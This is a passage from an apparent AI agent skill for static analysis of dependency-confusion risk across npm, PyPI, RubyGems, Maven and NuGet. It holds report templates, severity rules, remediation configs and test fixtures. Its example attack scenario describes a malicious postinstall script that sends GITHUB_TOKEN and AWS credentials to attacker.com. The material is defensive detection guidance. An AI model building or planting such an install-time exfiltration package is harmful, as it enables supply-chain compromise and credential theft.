> - **Registry config**: [e.g., "No .npmrc found" / ".npmrc present but registry=https://registry.npmjs.org/ (public)"]
> - **Attack scenario**: [e.g., "Attacker registers corp-auth-client@999.0.0 on npmjs.com with a postinstall script that exfiltrates GITHUB_TOKEN and AWS credentials to attacker.com; every developer and CI runner that runs `npm install` executes the malicious script"]
> - **Severity**: critical | high | medium
> - **exploitability**: reachable | conditional
> - **confidence**: high | medium | low
> - **chain_id**: "dep-confusion-rce" | "dep-confusion-secret-exfil" | null
> - **Impact**: [RCE at install time on developer machines, CI/CD runners, and production build hosts; credential exfiltration; build artifact poisoning]
> - **Remediation**: [Scope the package to `@company/corp-auth-client` and add `@company:registry=https://npm.internal.company.com/` to `.npmrc`. Remove or rename the unscoped package from the private registry. Audit all existing unscoped internal package names across npm, PyPI, RubyGems, Maven Central, and NuGet.org.]
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file` (line X)
> - **Ecosystem**: [ecosystem]
> - **Package name**: [name]
> - **Issue**: [e.g., "pip.conf sets index-url to internal PyPI but also adds extra-index-url pointing to pypi.org; pip resolves the highest version across both indexes, enabling substitution"]
> - **Lifecycle script**: [yes | no]
> - **Registry config**: [what was found and why it is insufficient]
> - **Severity**: high
> - **exploitability**: conditional
> - **confidence**: medium
> - **chain_id**: null
> - **Concern**: [what would need to be true for this to be fully exploitable]
> - **Remediation**: [Remove `extra-index-url = https://pypi.org/simple/` from pip.conf. If public packages are needed, route them through the internal PyPI mirror.]
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file` (line X)
> - **Ecosystem**: [ecosystem]
> - **Package name**: [name]
> - **Reason**: [e.g., "NuGet.config begins with <clear /> which removes all public feeds; only the internal Azure Artifacts feed is active" / "Package is @company/scoped with .npmrc entry @company:registry=https://npm.internal.company.com/ and lock file resolved URL confirms internal source"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file` (line X)
> - **Ecosystem**: [ecosystem]
> - **Package name**: [name]
> - **Uncertainty**: [e.g., "Internal Nexus is configured via settings.xml but it is unclear whether the Nexus 'maven-public' group proxies Maven Central for this specific groupId"]
> - **Suggestion**: [What a human reviewer should check — e.g., "Log in to the Nexus admin panel and confirm whether the 'maven-public' group includes Maven Central as a member repository. If it does, the groupId com.company is not protected by the mirror."]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `sast/depconfusion-batch-*.md` file and merge them into both `sast/depconfusion-results.md` (human-readable) and `sast/depconfusion-results.json` (machine-readable). You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/depconfusion-batch-1.md`, `sast/depconfusion-batch-2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list.
3. Count totals across all batches for the executive summary.
4. Assign a sequential numeric ID to each finding: `depconfusion-1`, `depconfusion-2`, etc. (ordered: Vulnerable first, then Likely Vulnerable, then Needs Manual Review, then Not Vulnerable).
5. Write the merged markdown report to `sast/depconfusion-results.md`:

```markdown
# Dependency Confusion Analysis Results: [Project Name]

## Executive Summary
- Candidates analyzed: [total from recon]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

6. Write the machine-readable JSON to `sast/depconfusion-results.json` using the canonical schema. For each Vulnerable, Likely Vulnerable, and Needs Manual Review finding, emit one JSON object. Not Vulnerable findings are omitted from the JSON (they are true negatives):

```json
{
  "findings": [
    {
      "id": "depconfusion-1",
      "skill": "sast-depconfusion",
      "severity": "critical",
      "title": "Unscoped internal npm package 'corp-auth-client' susceptible to dependency confusion",
      "description": "The package 'corp-auth-client' is declared in package.json dependencies without an @-scope prefix and no .npmrc registry lock is present. Any attacker who registers corp-auth-client@999.0.0 on npmjs.com with a malicious postinstall script achieves RCE on every machine that runs npm install, including CI/CD runners with access to production credentials.",
      "location": { "file": "package.json", "line": 12, "column": 5 },
      "remediation": "Rename the package to '@company/corp-auth-client' and add '@company:registry=https://npm.internal.company.com/' to .npmrc. Remove or decommission the unscoped package name from the internal registry. Audit all other unscoped internal-looking dependencies.",
      "exploitability": "reachable",
      "confidence": "high",
      "chain_id": "dep-confusion-rce"
    }
  ]
}
```

Field mapping from batch results to JSON:
- `id`: `depconfusion-<N>` sequential
- `skill`: always `"sast-depconfusion"`
- `severity`: from the batch finding's Severity field (`"critical"` for lifecycle-script + no registry lock; `"high"` for no lifecycle script but unprotected; `"medium"` for devDependency-only with no lifecycle script)
- `title`: short one-line description synthesized from the finding name and package name
- `description`: combine Issue + Attack scenario + Impact fields from the batch result
- `location.file`: path to the manifest file (package.json, requirements.txt, pom.xml, etc.)
- `location.line`: the line number of the package declaration in the manifest
- `location.column`: column if visible; `null` if not determined
- `remediation`: from the Remediation field in the batch result
- `exploitability`: from the exploitability field in the batch result
- `confidence`: from the confidence field in the batch result
- `chain_id`: from the chain_id field in the batch result (`null` if not set)

If no real findings exist (all candidates were Not Vulnerable), write `"findings": []` to the JSON file.

7. After writing both output files, **delete all intermediate batch files** (`sast/depconfusion-batch-*.md`) and the recon file (`sast/depconfusion-recon.md`).

---

## Severity Reference (CWE-427)

| Condition | Default Severity |
|---|---|
| Unscoped internal package + no registry lock + lifecycle script in production dependency | **critical** (supply-chain RCE at install time) |
| Unscoped internal package + no registry lock + no lifecycle script | **high** (package can be substituted; RCE on next code import) |
| Package protected by incomplete registry config (public fallback exists) + no lifecycle script | **high** (Likely Vulnerable) |
| DevDependency only, no lifecycle script, production builds use `--omit=dev` | **medium** |
| Registry config ambiguous; requires manual verification | **medium** (Needs Manual Review) |
| Strong registry lock confirmed (scoped + pinned registry + lock file integrity) | **info** (Not Vulnerable — omit from JSON) |

CWE reference: **CWE-427** (Uncontrolled Search Path Element), also related to **CWE-494** (Download of Code Without Integrity Check) when no hash pinning is present.

OWASP mapping: **A03:2021 — Injection** (supply-chain injection via package manager), **A08:2021 — Software and Data Integrity Failures** (unverified package source).

Web25 mapping: **A03** (Injection via dependency substitution).

---

## Remediation Reference

Include the relevant remediation in every finding's `remediation` field:

**npm — scope all internal packages**
```ini
# Step 1: Rename package in package.json
# Before:
"internal-utils": "^1.0.0"

# After:
"@company/internal-utils": "^1.0.0"

# Step 2: Add .npmrc at project root
@company:registry=https://npm.internal.company.com/
//npm.internal.company.com/:_authToken=${NPM_INTERNAL_TOKEN}
# Do NOT add a public fallback: registry=https://registry.npmjs.org/ should NOT be present
# if all packages are routed through the internal registry.
```

**npm — audit existing postinstall scripts in dependencies**
```bash
# Find all packages with lifecycle scripts that run at install time
cat package-lock.json | jq '.packages | to_entries[] | select(.value.scripts | (has("postinstall") or has("preinstall") or has("prepare"))) | {package: .key, scripts: .value.scripts}'

# For pnpm
pnpm list --json | jq '.[].dependencies | to_entries[] | .key' | xargs -I{} sh -c 'cat node_modules/{}/package.json 2>/dev/null | jq -r "select(.scripts.postinstall or .scripts.preinstall) | .name + \": \" + (.scripts.postinstall // .scripts.preinstall)"'
```

**npm — use `--ignore-scripts` in CI for initial install audits**
```bash
# Install without running any lifecycle scripts (for auditing purposes)
npm ci --ignore-scripts
# Then explicitly run only vetted scripts
```

**PyPI — remove the public extra-index-url**
```ini
# Before (VULNERABLE):
[global]
index-url = https://pypi.internal.company.com/simple/
extra-index-url = https://pypi.org/simple/

# After (SECURE):
[global]
index-url = https://pypi.internal.company.com/simple/
# Remove extra-index-url entirely. Route all public packages through the internal mirror.
```

**PyPI — enable hash pinning**
```bash
# Generate a hashed requirements file
pip install pip-tools
pip-compile --generate-hashes requirements.in -o requirements.txt

# Install with hash enforcement
pip install --require-hashes -r requirements.txt
```

```
# requirements.txt with --require-hashes
internal-analytics==3.2.1 \
    --hash=sha256:4b4f77f8b3c9d1e5a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5 \
    --hash=sha256:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2
```

**RubyGems — use per-gem source blocks**
```ruby
# Before (VULNERABLE):
source 'https://rubygems.org'
gem 'internal-auth', '~> 2.0'

# After (SECURE):
source 'https://rubygems.org'
gem 'internal-auth', '~> 2.0', source: 'https://gems.internal.company.com/'

# Or use a source block for multiple internal gems:
source 'https://gems.internal.company.com/' do
  gem 'internal-auth', '~> 2.0'
  gem 'corp-reporting-utils', '~> 1.5'
end
```

**Maven — enforce internal mirror for all repositories**
```xml
<!-- ~/.m2/settings.xml or CI-provided settings.xml -->
<settings>
  <mirrors>
    <mirror>
      <id>internal-nexus</id>
      <url>https://nexus.internal.company.com/repository/maven-public/</url>
      <mirrorOf>*</mirrorOf>  <!-- Routes ALL repository traffic through Nexus -->
    </mirror>
  </mirrors>
</settings>
```

**Gradle — remove mavenCentral() from build.gradle**
```groovy
// Before (VULNERABLE):
repositories {
    maven { url 'https://nexus.internal.company.com/repository/maven-releases/' }
    mavenCentral()  // Remove this
}

// After (SECURE):
repositories {
    maven {
        url 'https://nexus.internal.company.com/repository/maven-public/'
        // Nexus 'maven-public' group proxies Central internally — no direct Central access
    }
}
```

**NuGet — use `<clear />` in NuGet.config**
```xml
<!-- Before (VULNERABLE): -->
<configuration>
  <packageSources>
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
  </packageSources>
</configuration>

<!-- After (SECURE): -->
<configuration>
  <packageSources>
    <clear />  <!-- Removes all inherited sources including nuget.org -->
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
  </packageSources>
</configuration>
```

**General guidance**:
- Scope ALL internal packages under a company-owned namespace: `@company/` for npm, `company-` prefix registered on PyPI under a company organization account, `com.company.` groupId for Maven
- Enable Sigstore / GitHub Artifact Attestations for published packages to verify provenance
- Run `npm audit signatures` in CI to verify that installed packages were signed by their expected publisher
- Configure `allowedPackages` lists in `pip.conf` or use `pip-audit` in CI to block unexpected packages
- Use `pnpm install --frozen-lockfile` and `npm ci` (never `npm install`) in CI to prevent lock file drift
- Subscribe to PyPI / npm security advisories for your installed package names — set up alerts if an attacker-controlled version of an internal-looking package is published publicly
- Perform a one-time audit of all package names in use across all ecosystems: check whether any of them are already registered on the public registry (npm, PyPI, RubyGems, Maven Central, NuGet.org) by a third party

---

## Chain IDs

The following `chain_id` values are used by this skill:

| chain_id | Description | Chained skills |
|---|---|---|
| `dep-confusion-rce` | Lifecycle script in an unprotected dependency enables RCE at install time | `sast-depconfusion` → `sast-rce` |
| `dep-confusion-secret-exfil` | Install-time script plausibly exfiltrates build environment secrets (e.g., `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`) found in the environment | `sast-depconfusion` → `sast-hardcodedsecrets` |

Chain composition example:
```
sast-hardcodedsecrets finding: AWS_ACCESS_KEY_ID hardcoded in .env file
sast-depconfusion finding: postinstall script in unscoped internal dependency reads process.env
→ chain_id: "dep-confusion-secret-exfil" on the depconfusion finding
→ combined narrative: install-time lifecycle script can exfiltrate the hardcoded AWS credentials
  from the build environment to an attacker-controlled endpoint
```

---

## Test Fixture (True Positive / True Negative Reference)

The following minimal examples define what the skill MUST flag (TP) and MUST NOT flag (TN):

**TP — Must flag, exploitability: reachable, severity: critical (unscoped + postinstall)**
```json
// package.json — in project root, no .npmrc present
{
  "name": "company-web-app",
  "version": "1.0.0",
  "dependencies": {
    "react": "^18.2.0",
    "internal-utils": "^1.0.0"
  }
}
// internal-utils is unscoped; any attacker can register internal-utils@999.0.0 on npmjs.com
// with a postinstall script; no .npmrc is present to prevent public registry resolution
```

**TP — Must flag, exploitability: reachable, severity: high (unscoped, no lifecycle script)**
```
# requirements.txt
django==4.2.0
internal-analytics==3.2.1
# No --hash pins, pip.conf not found; internal-analytics resolves from pypi.org by default
```

**TP — Must flag, exploitability: conditional, severity: high (public PyPI fallback)**
```ini
# pip.conf
[global]
index-url = https://pypi.internal.company.com/simple/
extra-index-url = https://pypi.org/simple/
# The extra-index-url creates a public fallback; pip takes the highest version from either source
```

**TN — Must NOT flag (scoped package + .npmrc registry lock)**
```json
// package.json
{
  "dependencies": {
    "@company/internal-utils": "^1.0.0"
  }
}
```
```ini
# .npmrc
@company:registry=https://npm.internal.company.com/
//npm.internal.company.com/:_authToken=${NPM_INTERNAL_TOKEN}
```
Both conditions present: package is scoped AND `.npmrc` maps that scope to the internal registry.

**TN — Must NOT flag (NuGet with `<clear />`)**
```xml
<!-- NuGet.config -->
<configuration>
  <packageSources>
    <clear />
    <add key="InternalFeed" value="https://nuget.internal.company.com/v3/index.json" />
  </packageSources>
</configuration>
```
```xml
<!-- .csproj -->
<PackageReference Include="Company.Internal.Auth" Version="3.0.0" />
```
Despite the internal-looking package ID, the `<clear />` in `NuGet.config` prevents public nuget.org resolution.

**TN — Must NOT flag (PyPI with --require-hashes)**
```
# requirements.txt (installed with pip install --require-hashes -r requirements.txt)
internal-analytics==3.2.1 \
    --hash=sha256:4b4f77f8b3c9d1e5a2...abc123
```
Hash pinning prevents version substitution even if pip consults the public index.

Assert: only the TPs are flagged in results; TNs must appear as NOT VULNERABLE or be absent from the JSON findings array.

---

## Important Reminders

- Read `sast/architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 candidates per subagent**. If there are 1-3 candidates total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned candidates' text from the recon file plus the "Registry Configuration Files Found" section — not the entire recon file.
- **Phase 1 is purely structural**: flag any dependency name that looks internal AND could be registered on a public registry, regardless of whether the registry config actually allows it. Do not assess registry locks in Phase 1 — that is Phase 2's job.
- **Phase 2 is purely registry-lock analysis**: for each assigned candidate, determine whether a strict private-registry lock exists that prevents public-registry resolution. Set `exploitability` and `confidence` based on the evidence found.
- The most important FP source for this skill is **scoped packages with correct .npmrc configuration**: `@company/pkg` with `@company:registry=https://internal/` in `.npmrc` is fully protected. The scope alone is not enough; the `.npmrc` lock must also be present.
- The second most common FP source is **public packages that superficially match the internal naming pattern**: `internal` is a common word; check whether the package is truly an internal-only artifact or a commonly-used open-source package.
- **`extra-index-url` in `pip.conf` is the canonical PyPI attack surface**: many projects set `index-url` to an internal mirror but add `extra-index-url = https://pypi.org/simple/` for convenience. This is the pattern that enabled the original Dependency Confusion proof-of-concept. Flag it.
- **Lifecycle scripts escalate severity to critical**: a `postinstall` script in an unprotected dependency means RCE at install time — no further exploitation step is needed. Always check `node_modules/*/package.json` if the directory exists.
- **Maven Central is often the silent fallback**: many projects configure an internal Nexus repository but don't set `<mirrorOf>*</mirrorOf>`, leaving Maven Central as a fallback for any artifact not found internally. This is the Maven equivalent of `extra-index-url`.
- **`<clear />` is the correct NuGet fix** — not just adding the internal feed alongside `nuget.org`. Verify that `<clear />` is present and is the FIRST element in `<packageSources>`.
- Raise severity to **critical** when the dependency has a lifecycle script that runs code at install time. The default for a missing registry lock without a lifecycle script is **high**.
- The `chain_id: "dep-confusion-rce"` field should be set whenever a lifecycle script is present in an unprotected dependency — it signals to the report generator that this finding chains with `sast-rce`.
- The `chain_id: "dep-confusion-secret-exfil"` field should be set when the install-time script plausibly has access to build secrets (CI environment variables, `.env` files on the build host) — it chains with `sast-hardcodedsecrets`.
- Clean up intermediate files: delete `sast/depconfusion-recon.md` and all `sast/depconfusion-batch-*.md` files after the final reports are written. The only outputs that should remain are `sast/depconfusion-results.md` and `sast/depconfusion-results.json`.
- If `node_modules/` is not present (clean checkout), you can only inspect declared dependencies in manifest files — you cannot check transitive dependency lifecycle scripts. Note this limitation in the recon summary.
- For monorepos with multiple `package.json` files, check each workspace's dependencies and its local `.npmrc` independently — a root-level `.npmrc` may not apply to all workspaces.
- Sigstore / Artifact Attestations and `npm audit signatures` are proactive controls that reduce risk but do not eliminate the dependency confusion attack surface — an unscoped package is still at risk if the attacker can register a valid-looking signed package.
